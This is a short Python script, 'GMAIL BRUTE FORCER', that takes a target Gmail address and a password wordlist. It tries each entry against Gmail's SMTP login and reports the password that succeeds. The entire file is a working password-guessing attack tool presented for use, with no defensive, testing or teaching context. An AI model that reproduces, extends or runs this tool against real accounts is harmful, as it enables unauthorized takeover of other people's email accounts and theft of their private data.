import smtplib
from colored import bg, fg, attr

green = fg("green")
blue = fg("blue")
red = fg("red")


def gmail():
    print(blue + "-" * 88)
    print(blue + "GMAIL BRUTE FORCER")
    print(blue + "-" * 88)
    print(" ")
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()

        user = input(green + "[#] Enter the gmail address > ")
        pass_file = input(green + "[#] Enter the .txt file name name (wordlist.txt) > ")

        try:
            with open(pass_file, "r") as file:
                for password in file:
                    password = password.strip()
                    try:
                        server.login(user, password)
                        print(green + "[x] Password found ", password)
                        break
                    except:
                        print(red + "[-] Wrong password - " + str(password))
        except:
            print(red + "[-] No file found")
    except:
        print(red + "[x] Connection error")

